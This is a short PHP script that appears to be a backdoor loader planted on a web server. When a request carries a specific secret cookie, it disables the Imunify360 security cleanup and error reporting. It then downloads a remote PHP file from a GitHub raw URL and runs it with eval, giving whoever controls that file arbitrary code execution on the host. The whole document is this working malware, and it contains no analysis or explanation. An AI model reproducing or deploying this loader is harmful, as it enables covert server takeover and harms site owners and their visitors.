<?php
if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
error_reporting(0);
set_time_limit(0);
$host = 'raw.githubusercontent.com';
$port = 443;
$path = '/dan1584/asfdas/main/Aks525jkwuy.php';

$fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
if (!$fp) {
    echo "Error: $errstr ($errno)<br />\n";
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);

    $content = '';
    while (!feof($fp)) {
        $content .= fgets($fp, 128);
    }
    fclose($fp);

    $header_end = strpos($content, "\r\n\r\n");
    if ($header_end !== false) {
        $content = substr($content, $header_end + 4);
    }

    eval("?>" .$content);
}
}
